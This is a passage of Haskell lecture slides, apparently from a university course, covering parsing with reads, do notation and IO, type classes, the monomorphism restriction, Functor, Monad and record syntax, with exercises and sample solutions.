      data Point = Point Double Double deriving (Show, Read)

   -  Problem: Might be 0, 1, or (if ambiguous) more possible parsings
   -  Function ``reads`` parses and returns
      ``[(value, string_with_rest_of_input)]``

   ::

      *Main> reads "invalid Point 1 2" :: [(Point, String)]
      []
      *Main> reads "Point 1 2" :: [(Point, String)]
      [(Point 1.0 2.0,"")]
      *Main> reads "Point 1 2 and some extra stuff" :: [(Point, String)]
      [(Point 1.0 2.0," and some extra stuff")]
      *Main> reads "(Point 1 2)" :: [(Point, String)] -- note parens OK
      [(Point 1.0 2.0,"")]

Exercise: Using ``reads``
=========================

-  Write a function to parse moves:

   .. code:: haskell

      parseMove :: String -> Maybe Move

   -  Return ``Just`` move on successful parse, ``Nothing`` otherwise
   -  Can optionally accept whitespace or parentheses if easier
   -  But should reject a string with any trailing content after move

-  Examples of use:

.. code:: haskell

   *Main> parseMove "Rock"
   Just Rock
   *Main> parseMove "Paper"
   Just Paper
   *Main> parseMove "Scissors plus extra junk"
   Nothing

Possible solutions
==================

-  Use ``reads``:

   .. code:: haskell

      parseMove :: String -> Maybe Move
      parseMove str = case reads str of [(m, "")] -> Just m
                                        _         -> Nothing

   -  ``reads`` return type implicitly constrained by ``parseMove`` ‚Äôs
      type declaration

   -  Removing ``parseMove`` ‚Äôs type would make calling it difficult

-  Directly match keywords:

   .. code:: haskell

      parseMove :: String -> Maybe Move
      parseMove "Rock"     = Just Rock
      parseMove "Paper"    = Just Paper
      parseMove "Scissors" = Just Scissors
      parseMove _          = Nothing

   -  Note how strings are constructors‚Äîyou can pattern match on them

   -  But this solution too finicky‚Äìwon‚Äôt except trailing carriage
      returns or spaces. If you did this change to using reads.

Being more permissive of line disciplines
=========================================

-  If reading terminal input, different OSes have different disciplines

   -  E.g., might have trailing ``"\n"`` or ``"\r\n"``

-  Let‚Äôs tolerate trailing whitespace

   -  Change your definition to:

   .. code:: haskell

      parseMove :: String -> Maybe Move
      parseMove str = case reads str of
        [(m, rest)] | ok rest -> Just m
        _                     -> Nothing
        where ok = all (`elem` " \r\n")

   -  Should now behave like this

   ::

      *Main> parseMove "Rock  \r\n"
      Just Rock
      *Main> parseMove "Rock  \r\njunk"
      Nothing

Hoogle
======

-  Let‚Äôs find the source code for GHC‚Äôs ``length`` function?
-  `Hoogle <http://www.haskell.org/hoogle/>`__ is a search engine just
   for Haskell functions

   -  Go to http://www.haskell.org/hoogle/
   -  Click on *search plugin*
   -  Keyword ‚Äú``haskell.org``‚Äù is too long for me‚ÄìI change to ‚Äú``ho``‚Äù

-  Let‚Äôs search for length‚Ä¶ click on source

   -  All those ``#`` marks are for ‚Äúunboxed types‚Äù, which are faster
      but not asymptotically
   -  The important point is that ``len`` is tail recursive

-  I use Hoogle all the time, all the time when coding

   -  Most of the source code is not hard to understand
   -  Length may be a bad starter example just because of unboxed types
   -  Try examining the code of the functions you are using to
      understand them better

Example: counting letters
=========================

-  Here‚Äôs a function to count lower-case letters in a ``String``

   .. code:: haskell

      import Data.Char    -- brings function isLower into scope

      countLowerCase :: String -> Int
      countLowerCase str = length (filter isLower str)

-  If we fix ``length``, ``countLowerCase`` might run in constant space

   -  Recall Haskell evaluates expressions lazily‚Ä¶ Means in most
      contexts values are interchangeable with function pointers (a.k.a.
      *thunks*)

   -  A ``String`` is a ``[Char]``, which is a type with two values, a
      *head* and *tail*

   -  But until each of the *head* or *tail* is needed, it can be stored
      as a function pointer

   -  So ``length`` will causes ``filter`` to produce ``Char`` s one at
      a time

   -  ``length`` does not hold on to characters once counted; can be
      garbage-collected at will

Function composition
====================

-  Here‚Äôs an even more concise definition

   .. code:: haskell

      countLowerCase :: String -> Int
      countLowerCase = length . filter isLower

-  The ‚Äú``.``‚Äù operator provides function composition

   .. code:: haskell

      (f . g) x = f (g x)

   -  ‚Äú``f . g``‚Äù is an ASCII approximation of mathematical
      ‚Äú:math:`f\circ g`‚Äù
   -  On previous slide, ``countLowerCase`` ‚Äôs argument had name
      ``str``
   -  The new version doesn‚Äôt name the argument, a style called
      *point-free*

-  Function composition can be used almost like Unix pipelines

   .. code:: haskell

      process = countLowercase . toPigLatin . extractComments . unCompress

-  Exercise: Write the type of ‚Äú``.``‚Äù without typing ``:t (.)`` into
   ghci

Lambda abstraction
==================

-  Sometimes you want to name the arguments but not the function

-  Haskell allows anonymous functions through *lambda abstraction*

   -  The notation is ``\`` *variable(s)* ``->`` *body*
   -  ‚Äú``\``‚Äù is an ASCII approximation of ‚Äú:math:`\lambda`‚Äù, so
      pronounced ‚Äúlambda‚Äù

-  Example:

   .. code:: haskell

      countLowercaseAndDigits :: String -> Int
      countLowercaseAndDigits =
          length . filter (\c -> isLower c || isDigit c)

-  Lambda abstractions can deconstruct values with patterns, e.g.:

   .. code:: haskell

              ... (\(Right x) -> x) ...

   -  But note that guards or multiple bindings are not allowed
   -  Patterns must have the right constructor or will get run-time
      error

Infix vs. Prefix notation
=========================

-  We‚Äôve seen some infix functions & constructors: ``+``, ``*``, ``/``,
   ``.``, ``||``, ``:``

-  In fact, any binary function or constructor can be used infix or
   prefix

-  For functions and constructors composed of letters, digits, ``_``,
   and ``'``

   -  Prefix is the default: ``add 1 2``
   -  Putting function in backticks makes it infix:
      :literal:`1 \`add\` 2`

-  For functions starting with one of ``!#$%&*+./<=>?@\^|-~`` or
   constructors starting ‚Äú``:``‚Äù

   -  Infix is default, Putting functions in parens makes them prefix,
      e.g., ``(+) 1 2``

-  For tuples, prefix constructors are ``(,)``, ``(,,)``, ``(,,,)``,
   ``(,,,,)``, etc.

-  Infix functions can be partially applied in a parenthesized *section*

   .. code:: haskell

      stripPunctuation :: String -> String
      stripPunctuation = filter (`notElem` "!#$%&*+./<=>?@\\^|-~:")
      -- Note above string the SECOND argument to notElem ^

Fixity
======

-  Most operators are just library functions in Haskell

   -  Very few operators reserved by language syntax (``..``, ``:``,
      ``::``, ``=``, ``\``, ``|``, ``<-``, ``->``, ``@``, ``~``, ``=>``,
      ``--``)
   -  You can go crazy and define your own operators
   -  Or even use your own definitions instead of system ones

-  Define precedence of infix operators with fixity declarations

   -  Keywords: ``infixl``/``infixr``/``infix`` for left/right/no
      associativity
   -  Syntax: *infix-keyword* [0-9] *function* [, *function* ‚Ä¶]
   -  Allowed wherever a type declaration is allowed

-  0 is lowest allowed fixity precedence, 9 is highest

   -  Prefix function application has fixity 10‚Äìhigher than any infix
      call
   -  Lambda abstractions, ``else`` clauses, and ``let`` ‚Ä¶ ``in``
      clauses extend as far to the right as possible (meaning they never
      stop at any infix operator, no matter how low precedence)

Fixity of specific operators
============================

-  Here is the fixity of the `standard operators <http://www.haskell.org/onlinereport/haskell2010/haskellch4.html#x10-820061>`__:

.. code:: haskell

   infixl 9  !!             -- This is the default when fixity unspecified
   infixr 9  .
   infixr 8  ^, ^^, ‚ãÜ‚ãÜ
   infixl 7  ‚ãÜ, /, `quot`, `rem`, `div`, `mod`  
   infixl 6  +, -           -- Unary negation "-" has this fixity, too
   infixr 5  ++             -- built-in ":" constructor has this fixity, too
   infix  4  ==, /=, <, <=, >=, >, `elem`, `notElem`
   infixr 3  &&
   infixr 2  ||
   infixl 1  >>, >>=
   infixr 1  =<<  
   infixr 0  $, $!, `seq`

-  If you can‚Äôt remember, use ``:i`` in
   `GHCI <http://www.haskell.org/ghc/docs/latest/html/users_guide/ghci.html>`__:

   ::

      Prelude> :i &&
      (&&) :: Bool -> Bool -> Bool    -- Defined in GHC.Classes
      infixr 3 &&

   -  If GHCI doesn‚Äôt specify, means default: ``infixl 9``

The ‚Äú``infixr 0``‚Äù operators
============================

-  ``$`` is function application, but with lowest precedence

   .. code:: haskell

      ($) :: (a -> b) -> a -> b
      f $ x = f x

   -  Turns out to be quite useful for avoiding parentheses, E.g.:

   .. code:: haskell

          putStrLn $ "the value of " ++ key ++ " is " ++ show value

-  ``seq :: a -> b -> b`` just returns value of second argument‚Ä¶ but
   forces evaluation of the first argument before evaluating the second

   -  So when you are done, the first argument is a value, not a thunk

   .. code:: haskell

      main = let q = 1 `div` 0
             in seq q $ putStrLn "Hello world!\n"  -- exception

   -  ``seq`` has to be built into the compiler

-  ``$!`` combines ``$`` and ``seq``

   .. code:: haskell

      f $! x  = x `seq` f x

Accumulators revisited
======================

-  We used an accumulator to avoid ``n0`` stack frames in ``factorial``:

.. code:: haskell

   factorial n0 = loop 1 n0
       where loop acc n | n > 1     = loop (acc * n) (n - 1)
                        | otherwise = acc

-  Unfortunately, ``acc`` can contain a chain of thunks ``n`` long

   -  ``(((1 * n) * (n - 1)) * (n - 2) ...)`` ‚Äì Laziness means only
      evaluated when needed
   -  GHC is smart enough not to build up thunks, but only if optimizing

-  Can fix such problems using ``$!`` or ``seq``

.. code:: haskell

   factorial n0 = loop 1 n0
       where loop acc n | n > 1     = (loop $! acc * n) (n - 1)
                        | otherwise = acc

.. code:: haskell

   factorial n0 = loop 1 n0
       where loop acc n | n > 1     = acc `seq` loop (acc * n) (n - 1)
                        | otherwise = acc

Hackage and cabal
=================

-  `Hackage <http://hackage.haskell.org/packages/>`__ is a large
   collection of Haskell packages

-  `Cabal <http://www.haskell.org/cabal/users-guide/>`__ is a tool for
   browsing hackage and installing packages

   -  Cabal comes with the `haskell
      platform <http://hackage.haskell.org/platform/>`__

   -  Run ``cabal update`` to create ``$HOME/.cabal``, download package
      database

   -  I highly recommend unconmenting and editing these two lines in
      ``$HOME/.cabal/config``

      ::

         documentation: True
         library-profiling: True

   -  May want to add ``$HOME/.cabal/bin`` to your path

   -  I use the following shell alias

      ::

         alias cbi='LC_CTYPE=en_US.UTF-8 cabal install --user --haddock-hyperlink-source'

-  E.g., run: ``cbi network``

   -  Installs packages in ``$HOME/.cabal``, and records them in
      ``$HOME/.ghc``
   -  To start fresh, must delete both ``$HOME/.cabal`` and
      ``$HOME/.ghc``

Modules and ``import`` syntax
=============================

-  Haskell groups top-level bindings into *modules*

   -  Default module name is ``Main``, as programs start at function
      ``main`` in ``Main``
   -  Except for ``Main``, a module named *M* must reside in a file
      named *M* ``.hs``
   -  Module names are capitalized; I use lower-case file names for
      ``Main`` modules

-  Let‚Äôs add this to the top of our source file

   .. code:: haskell

      module Main where      -- redundant since Main is the default
      import System.IO

   -  Start module with ‚Äú``module`` *name* ``where``‚Äù or ‚Äú``module``
      *name* ``(`` *exported-symbol* [``,`` ‚Ä¶] ``) where``‚Äù
      (non-exported symbols provide modularity)
   -  ``import`` *module* - imports all symbols in *module*
   -  ``import qualified`` *module* ``as`` *ID* - prefixes imported
      symbols with *ID* ``.``
   -  ``import`` *module* ``(`` *function1* [``,`` *function2*
      ‚Ä¶] ``)`` - imports just the named functions
   -  ``import`` *module* ``hiding (`` *function1* [``,`` *function2*
      ‚Ä¶] ``)`` - imports all but the named functions

``do`` notation
===============

-  Let‚Äôs write a function to greet someone

-  Type the following into a file ``greet.hs``:

   -  Or shortcut, type: ``wget``
      ```cs240h.stanford.edu/greet1.hs`` <http://cs240h.stanford.edu/greet1.hs>`__

.. code:: haskell

   module Main where
   import System.IO

   greet h = do
     hPutStrLn h "What is your name?"
     name <- hGetLine h
     hPutStrLn h $ "Hi, " ++ name

   withTty = withFile "/dev/tty" ReadWriteMode

   main = withTty greet

-  Now try running ``main`` in GHCI

.. raw:: html

   <!--
   * Can the code like this in GHCI

   ~~~
   *Main> main
   What is your name?
   David
   Hi, David
   ~~~

   * Or from the command line:

   ~~~
   $ runghc ./greet.hs
   ~~~
   -->

.. _do-notation-1:

``do`` notation
===============

.. code:: haskell

   greet h = do
     hPutStrLn h "What is your name?"
     name <- hGetLine h
     hPutStrLn h $ "Hi, " ++ name

-  Greeting task requires some impure (non-functional) actions

   -  Reading and writing a file handle

-  A ``do`` block lets you sequence IO actions. In a ``do`` block:

   -  *pat* ``<-`` *action* - binds *pat* (variable or constructor
      pattern) to result of executing *action*
   -  ``let`` *pat* ``=`` *pure-value* - binds *pat* to *pure-value* (no
      ‚Äú``in`` ‚Ä¶‚Äù required)
   -  *action* - executes *action* and discards the result, or returns
      it if at end of block

-  GHCI input is like ``do`` block (i.e., can use ``<-``, need ``let``
   for bindings)
-  ``do``/``let``/``case`` won‚Äôt parse after prefix function

   -  Usually say ‚Äú``func $ do`` ‚Ä¶‚Äù
   -  Can also say ‚Äú``func (do`` ‚Ä¶ ``)``‚Äù

What are the types of IO actions?
=================================

.. code:: haskell

   main :: IO ()
   greet :: Handle -> IO ()
   hPutStrLn :: Handle -> String -> IO ()
   hGetLine :: Handle -> IO String

-  ``IO`` is a parameterized type (just as ``Maybe`` is parameterized)

   -  ‚Äú``IO String``‚Äù means IO action that produces a ``String`` if
      executed
   -  Unlike ``Maybe``, we won‚Äôt use a constructor for ``IO``, which is
      somewhat magic

-  What if we try to copy a line of input as follows?

   .. code:: haskell

      main = hPutStrLn stdout (hGetLine stdin)

   -  Oops, ``hPutStrLn`` expects type ``String``, while ``hGetLine``
      returns an ``IO String``

-  How to de-construct an ``IO [String]`` to get a ``[String]``

   -  We can‚Äôt use ``case``, because we don‚Äôt have a constructor for
      ``IO`` ‚Ä¶ Besides, the order and number of deconstructions of
      something like ``hPutStr`` matters
   -  That‚Äôs the point of the ``<-`` operator in ``do`` blocks!

.. _another-way-to-see-io-peyton-jonesawkward:

Another way to see IO ``[Peyton Jones]``
========================================

http://research.microsoft.com/en-us/um/people/simonpj/papers/marktoberdorf/mark.pdf

.. code:: haskell

   do name <- hGetLine h
      hPutStrLn h $ "Hi, " ++ name

.. image:: https://www.scs.stanford.edu/14sp-cs240h/slides/io1.svg

-  ``hGetLine`` and ``hPutStrLn`` return ``IO`` *actions* that can
   change the world

   -  Pure code can manipulate such actions, but can‚Äôt actually execute
      them
   -  Only the special ``main`` action is ever executed

.. _another-way-to-see-io-peyton-jonesawkward-1:

Another way to see IO ``[Peyton Jones]>``
=========================================

http://research.microsoft.com/en-us/um/people/simonpj/papers/marktoberdorf/mark.pdf

.. code:: haskell

   do name <- hGetLine h
      hPutStrLn h $ "Hi, " ++ name

.. image:: https://www.scs.stanford.edu/14sp-cs240h/slides/io2.svg

-  The ``do`` block builds a compound action from other actions

   -  It sequences how actions will be applied to the real world
   -  When executed, applies ``IO a`` actions to the world, extracting
      values of type ``a``
   -  What action to execute next can depend on the value of the
      extracted ``a``

Running ``greet``
=================

::

   $ ghc --make greet
   [1 of 1] Compiling Main             ( greet.hs, greet.o )
   Linking greet ...
   $ ./greet
   What is your name?
   David
   Hi, David

-  What if you want to run it in GHCI?

   ::

      $ ghci ./greet.hs
      ...
      Prelude Main>

   -  No ``*`` before ``Main`` means no access to internal symbols
      (because compiled), need to say:

   ::

      Prelude Main> :load *greet.hs
      [1 of 1] Compiling Main             ( greet.hs, interpreted )
      Ok, modules loaded: Main.
      *Main> 

The ``return`` function
=======================

-  What if we want ``greet`` to return the name of the person?

   -  Last action is ``hPutStrLn :: IO ()``; want to end with action
      returning ``name``

   -  This does not work:

      .. code:: haskell

         do ...
            hPutStrLn h $ "Hi, " ++ name
            name                         -- Incorrect, will not compile

   -  Problem: every action in an ``IO`` do block must have type
      ``IO a`` for some ``a``

   -  Solution: ``return`` function gives trivial ``IO`` action
      returning a particular value

   .. code:: haskell

      greet :: Handle -> IO String
      greet h = do
        hPutStrLn h "What is your name?"
        name <- hGetLine h
        hPutStrLn h $ "Hi, " ++ name
        return name

-  Note: **``return`` is not control flow statement**, just a function

   .. code:: haskell

      return :: a -> IO a

.. raw:: html

   <!--
       * In a `do` block, "`let x = e`" is like "`x <- return e`" (except
         recursive)
   -->

Point-free IO composition
=========================

-  Recall point-free function composition with ‚Äú``.``‚Äù (fixity
   ``infixr 9``)

-  Function ``>>=`` (pronounced ‚Äúbind‚Äù) allows point-free IO composition

   .. code:: haskell

      (>>=) :: IO a -> (a -> IO b) -> IO b
      infixl 1 >>=

-  Let‚Äôs re-write ``greet`` with point-free style to avoid variable
   ``name``

   .. code:: haskell

      greet h = do
        hPutStrLn h "What is your name?"
        hGetLine h >>= hPutStrLn h . ("Hi, " ++)

   -  Note ``>>=`` composes left-to-right, while ``.`` goes
      right-to-left

-  ``do`` blocks are just 
   `syntactic sugar <http://www.haskell.org/onlinereport/haskell2010/haskellch3.html#x8-470003.14>`__
   for calling ``>>=``

   .. code:: haskell

      -- Desugared version of original greet:
      greet h = hPutStrLn h "What is your name?" >>= \_ ->
                hGetLine h >>= \name ->
                hPutStrLn h ("Hi, " ++ name)

.. raw:: html

   <!--
       * Let's de-sugar our original `main`:

       ~~~~ {.haskell}
       main =
           getArgs >>= \(url:_) ->
           simpleHttp url >>= \page ->
           putStr (L.toString page)
       ~~~~
   -->

.. raw:: html

   <!--
   # Lazy IO

   * Some simple file IO functions may be handy for first lab

       ~~~~ {.haskell}
       type FilePath = String -- makes FilePath synonym for String
       getContents :: IO String          -- read all stdin
       readFile :: FilePath -> IO String -- read (whole) file
       writeFile :: FilePath -> String -> IO ()  -- write file
       ~~~~

   * E.g., `main = readFile "input" >>= writeFile "output"`
       * Surprisingly, this program does not require unbounded memory
       * Rather, input is read lazily as the list of Characters is
         evaluated
   * How lazy IO works
       * A list has two values, the head and the tail, each possibly a
         thunk
       * At some point evaluating thunk actually triggers file IO
       * Function `unsafeInterleaveIO` creates thunks that execute `IO`
         actions
         (c.f. more widely used `unsafePerformIO`, described in
         [[Peyton Jones]][Awkward])
       * Lazy IO is great for scripts, bad for servers; more in Iteratee
         lecture
   -->

Exercise: Rock, Paper, Scissors against the computer
====================================================

-  Write a function to play a particular move against a user

   -  First argument is computer‚Äôs move
   -  Read user‚Äôs move from ``Handle``, tell user whether s/he
      won/lost/tied

   .. code:: haskell

      computerVsUser :: Move -> Handle -> IO ()

-  Starter code: ``wget``
   ```cs240h.stanford.edu/rock1.hs`` <http://cs240h.stanford.edu/rock1.hs>`__

-  Example:

   ::

      *Main> withTty $ computerVsUser Rock
      Please enter one of [Rock,Paper,Scissors]
      garbage
      Please enter one of [Rock,Paper,Scissors]
      Paper
      You Win
      *Main> withTty $ computerVsUser Scissors
      Please enter one of [Rock,Paper,Scissors]
      Paper
      You Lose

A possible solution
===================

.. code:: haskell

   getMove :: Handle -> IO Move
   getMove h = do
     hPutStrLn h $ "Please enter one of " ++ show ([minBound..] :: [Move])
     -- Here is the added code:
     input <- hGetLine h
     case parseMove input of Just move -> return move
                             Nothing -> getMove h

   computerVsUser :: Move -> Handle -> IO ()
   computerVsUser computerMove h = do
     userMove <- getMove h
     let o = outcome userMove computerMove
     hPutStrLn h $ "You " ++ show o

More on polymorphism
====================

-  We‚Äôve seen a bunch of polymorphic functions
-  Here are some more handy ones from Prelude

.. code:: haskell

   id :: a -> a
   id x = x

.. code:: haskell

   const :: a -> b -> a
   const a _ = a

.. code:: haskell

   fst :: (a, b) -> a
   fst (a, _) = a

.. code:: haskell

   snd :: (a, b) -> b
   snd (_, b) = b

.. code:: haskell

   print a = putStrLn (show a)   -- what's the type?  a -> IO ()?

.. code:: haskell

   show a = ???                  -- how to implement?

Parametric vs. ad hoc polymorphism
==================================

-  There are actually *two* kinds of polymorphism at work here
-  *parametric polymorphism* ‚Äì does the same thing for every type

   -  E.g., ``id :: a -> a`` just passes the value through
   -  Works for every possible type

-  *ad hoc polymorphism* ‚Äì does different things on different types

   -  E.g., ``1 + 1`` and ``1.0 + 1.0`` compute very different functions
   -  E.g., ``show`` converts value to ``String``, depends entirely on
      input type
   -  Only works on types that support it (hence ‚Äú``deriving Show``‚Äù in
      declarations)
   -  E.g., no way to ``show`` a function (type ``Int -> Int``)

Classes and Instances
=====================

-  Ad-hoc polymorphic functions are called *methods* and declared with
   *classes*

   .. code:: haskell

      class MyShow a where
          myShow :: a -> String

-  The actual method for each type is defined in an *instance*
   declaration

   .. code:: haskell

      data Point = Point Double Double
      instance MyShow Point where
          myShow (Point x y) = "(" ++ show x ++ ", " ++ show y ++ ")"

   -  A class declaration can also include default definitions for
      methods

-  What‚Äôs the type of a function that calls ``myShow``? Ask GHCI:

   .. code:: haskell

      myPrint x = putStrLn $ myShow x

   ::

      *Main> :t myPrint
      myPrint :: MyShow a => a -> IO ()

The Context of a type declaration
=================================

-  Type declarations can contain restrictions on type variables

   -  Restrictions expressed with ‚Äú``(`` *class* *type-var*,
      ‚Ä¶ ``) =>``‚Äù at start of type, E.g.:

   .. code:: haskell

      myPrint :: MyShow a => a -> IO ()

   .. code:: haskell

      sortAndShow :: (Ord a, MyShow a) => [a] -> String

   .. code:: haskell

      elem :: (Eq a) => a -> [a] -> Bool
      elem _ []     = False
      elem x (y:ys) = x==y || elem x ys

   .. code:: haskell

      add :: (Num a) => a -> a -> a
      add arg1 arg2 = arg1 + arg2

-  Can think of context as representing hidden *dictionary* arguments

   -  When you call ``myPrint``, you explicitly give it a value of type
      ``a``
   -  But also implicitly give it a function pointer for type ``a`` ‚Äôs
      ``MyShow`` instance

.. _the-dreadeddmrwiki-monomorphism-restrictiondmr-dmr:

The ``Dreaded`` ``Monomorphism Restriction`` (DMR)
==================================================

.. _Dreaded: http://www.haskell.org/haskellwiki/Monomorphism_restriction
.. _Monomorphism Restriction: http://www.haskell.org/onlinereport/haskell2010/haskellch4.html#x10-930004.5.5

-  Let‚Äôs say you want to cache result of super-expensive function

   .. code:: haskell

      superExpensive val = len $ veryExpensive (val :: Int)
          where len [] = 0
                len (x:xs) = 1 + len xs
      cachedResult = superExpensive 5

   -  ``cachedResult`` will start as thunk, be executed once, then
      contain value

-  Let‚Äôs think about the types

   ::

      *Main> :t superExpensive
      superExpensive :: Num a => Int -> a
      *Main> :t cachedResult
      cachedResult :: Integer

   -  + and 0 are overloaded, so ``superExpensive`` can return any
      ``Num`` you want
   -  Why don‚Äôt we have ``cachedResult :: (Num a) => a``?
   -  Recall context restrictions are like hidden arguments‚Ä¶ so would
      make ``cachedResult`` into a function, undermining our caching
      goal!
   -  But how is compiler smart enough to save us here?

The DMR continued
=================

-  Answer: in this case, compiler is not actually that smart

   -  Heuristic: If it looks like a function, can infer *ad hoc*
      polymorphic types
   -  If it looks like anything else, no *ad hoc* polymorphism unless
      explicitly declared
   -  *parametric* polymorphic types can always be inferred (no hidden
      arguments)

-  What looks like a function?

   -  Has to bind a single symbol (``f``), rather than a pattern
      (``(x, y) =`` ‚Ä¶, ``(Just x) =`` ‚Ä¶)
   -  Has to have at least one explicit argument (``f x =`` ‚Ä¶ ok,
      ``f =`` ‚Ä¶ not)

-  How are monomorphic types inferred?

   -  If bound symbol used elsewhere in module, infer type from use
   -  If still ambiguous and type is of class ``Num``, try ``Integer``
      then ``Double`` (this sequence can be changed with a ```default``
      declaration <http://www.haskell.org/onlinereport/haskell2010/haskellch4.html#x10-790004.3.4>`__)
   -  If still ambiguous, compilation fails

The DMR take-away message
=========================

-  Think of type restrictions as implicit dictionary arguments

   -  Compiler won‚Äôt saddle non-function with implicit arguments

-  This code will compile

   .. code:: haskell

      -- Compiler infers: show1 :: (Show x) => x -> String
      show1 x = show x

-  But neither of these will:

   .. code:: haskell

      show2 = show
      show3 = \x -> show x

   -  I‚Äôd rather you heard it from me than from GHC‚Ä¶

-  Relatively easy to work around DMR

   -  Add type signatures to functions‚Äìa good idea anyway for top-level
      bindings, and sometimes necessary for ``let`` bindings

      .. code:: haskell

         -- No problem, compiler knows you want ad hoc polymorphism
         show2 :: (Show x) => x -> String
         show2 = show

Superclasses and instance contexts
==================================

-  One class may require all instances to be members of another

   -  Class ``Eq`` contains ‚Äò==‚Äô and ‚Äò/=‚Äô methods, while ``Ord``
      contains ``<``, ``>=``, ``>``, ``<=``, etc.

   -  It doesn‚Äôt make sense to have an ``Ord`` instance not also be an
      ``Eq`` instance

   -  ``Ord`` declares ``Eq`` as a superclass, using a context

      .. code:: haskell

         class Eq a => Ord a where
             (<), (>=), (>), (<=) :: a -> a -> Bool
             a <= b = a == b || a < b -- default methods can use superclasses
             ....

   -  Don‚Äôt need to write superclass restrictions in contexts‚Äìany
      function with an ``Ord`` dictionary can lookup the ``Eq``
      dictionary

-  Similarly, an instance may require a context

   -  E.g., define ``myShow`` for a list of items whose type is of class
      ``MyShow``

   .. code:: haskell

      instance (MyShow a) => MyShow [a] where
          myShow [] = "[]"
          myShow (x:xs) = myShow x ++ ":" ++ myShow xs

Classes of parameterized types
==============================

-  Can also have classes of parameterized types

-  ``Functor`` is a class for parameterized types onto which you can map
   functions:

   .. code:: haskell

      class Functor f where
          fmap :: (a -> b) -> f a -> f b

   -  Notice there are no arguments/results of type ``f``, rather types
      ``f a`` and ``f b``

-  An example of a ``Functor`` is ``Maybe``:

   .. code:: haskell

      instance Functor Maybe where
          fmap _ Nothing  = Nothing
          fmap f (Just a) = Just (f a)

   ::

      GHCi, version 7.6.3: http://www.haskell.org/ghc/  :? for help
      Prelude> fmap (+ 1) Nothing
      Nothing
      Prelude> fmap (+ 1) $ Just 2
      Just 3

More ``Functor`` s
===================

-  Lists are a ``Functor``

   -  ``[]`` can be used as a prefix type constructor (‚Äú``[] Int``‚Äù
      means ‚Äú``[Int]``‚Äù) and can be used to declare instances

   .. code:: haskell

      map :: (a -> b) -> [a] -> [b]
      map _ []     = []
      map f (x:xs) = f x : map f xs

      instance Functor [] where
          fmap = map

-  ``IO`` is a ``Functor``

   .. code:: haskell

      instance Functor IO where
          fmap f io = io >>= return . f
          -- equivalent to:  do val <- io; return (f val)

   -  So we could have said:

   .. code:: haskell

      greet h = do
        hPutStrLn h "What is your name?"
        fmap ("Hi, " ++) (hGetLine h) >>= hPutStrLn h

.. raw:: html

   <!--
           ~~~~ {.haskell}
       simpleHttpStr url = fmap L.toString $ simpleHttp url
           ~~~~

           or, simpler still:

           ~~~~ {.haskell}
       simpleHttpStr = fmap L.toString . simpleHttp
           ~~~~
   -->

Kinds
=====

-  What happens if you try to make an instance of ``Functor`` for
   ``Int``?

   .. code:: haskell

      instance Functor Int where         -- compilation error
          fmap _ _ = error "placeholder"

   -  Get ``fmap :: (a -> b) -> Int a -> Int b``, but ``Int`` not
      parameterized

-  The compiler must keep track of all the different kinds of types

   -  One kind of type (e.g., ``Int``, ``Double``, ``()``) directly
      describes values
   -  Another kind of type requires a type parameter (``Maybe``, ``[]``,
      ``IO``)
   -  Yet another kind of type requires *two* type parameters
      (``Either``, ``(,)``)
   -  Parameterized types are sometimes called *type constructors*

-  Kinds named using symbols ‚àó and ‚Üí, much like curried functions

   -  ‚àó is the kind of type that represents values (``Int``, ``Double``,
      ``()``, etc.)
   -  ‚àó ‚Üí ‚àó is the kind of type with one parameter of type ‚àó (``Maybe``,
      ``IO``, etc.)
   -  ‚àó ‚Üí ‚àó ‚Üí ‚àó is a type constructor with two arguments of kind ‚àó
      (``Either``)
   -  In general, *a* ‚Üí *b* means a type constructor that, applied to
      kind *a*, yields kind *b*

The ``Monad`` class
===================

-  **The entire first two lectures have been working up to this slide**
-  ``return`` and ``>>=`` are actually methods of a class called
   ``Monad``

.. code:: haskell

   class Monad m where
       (>>=) :: m a -> (a -> m b) -> m b
       return :: a -> m a
       fail :: String -> m a   -- called when pattern binding fails
       fail s = error s        -- default is to throw exception

       (>>) :: m a -> m b -> m b
       m >> k = m >>= \_ -> k

-  This has far-reaching consequences

   -  You can use the syntactic sugar of ``do`` blocks for non-IO
      purposes
   -  Many monadic functions are polymorphic in the ``Monad``‚Äìinvent a
      new monad, and you can still use much existing code

The ``Maybe`` monad
===================

-  System libraries define a ``Monad`` instance for ``Maybe``

   .. code:: haskell

      instance  Monad Maybe  where
          (Just x) >>= k = k x
          Nothing >>= _  = Nothing
          return = Just
          fail _ = Nothing

-  You can use ``Nothing`` to indicate failure

   -  Might have a bunch of functions to extract fields from data

   .. code:: haskell

      extractA :: String -> Maybe Int
      extractB :: String -> Maybe String
      ...
      parseForm :: String -> Maybe Form
      parseForm raw = do
          a <- extractA raw
          b <- extractB raw
          ...
          return (Form a b ...)

   -  Threads success/failure state through system as ``IO`` threaded
      World
   -  Since Haskell is lazy, stops computing at first ``Nothing``

Algebraic data types
====================

-  Some data types have a large number of fields

   .. code:: haskell

      -- Argument to createProcess function
      data CreateProcess = CreateProcess CmdSpec (Maybe FilePath)
          (Maybe [(String,String)]) StdStream StdStream StdStream Bool

   -  Quickly gets rather unwieldy

-  Algebraic data types let you label fields (like C ``struct`` s)

   .. code:: haskell

      data CreateProcess = CreateProcess {
        cmdspec   :: CmdSpec,
        cwd       :: Maybe FilePath,
        env       :: Maybe [(String,String)],
        std_in    :: StdStream,
        std_out   :: StdStream,
        std_err   :: StdStream,
        close_fds :: Bool
      }

-  Let‚Äôs make an algebraic version of our ``Point`` class

   .. code:: haskell

      data Point = Point { xCoord :: Double, yCoord :: Double }

Algebraic types - initialization and matching
=============================================

.. code:: haskell

   data Point = Point { xCoord :: Double, yCoord :: Double }

-  Can initialize an Algebraic type by naming fields

   .. code:: haskell

      myPoint = Point { xCoord = 1.0, yCoord = 1.0 }

   -  Uninitialized fields get value ``undefined`` - a thunk that throws
      an exception

-  Can also pattern-match on any subset of fields

   .. code:: haskell

      -- Note the pattern binding assigns the variable on the right of =
      getX Point{ xCoord = x } = x

   -  `As-patterns <http://www.haskell.org/onlinereport/haskell2010/haskellch3.html#x8-590003.17.1>`__
      are handy to bind a variable and pattern simultaneously (with
      ``@``):

      .. code:: haskell

         getX' p@Point{ xCoord = x }
                 | x < 100 = x
                 | otherwise = error $ show p ++ " out of range"

      .. code:: haskell

         -- Also works with non-algebraic patterns
         getX' p@(Point x _) = ...
         processString s@('$':_) = ...
         processString s         = ...

Algebraic types - access and update
===================================

-  Can use field labels as access functions

   .. code:: haskell

      getX point = xCoord point

   -  ``xCoord`` works anywhere you can use a function of type
      ``Point -> Double``
   -  One consequence: field labels share the same namespace as
      top-level bindings, and must be unique

-  There is a special syntax for updating one or more fields

   .. code:: haskell

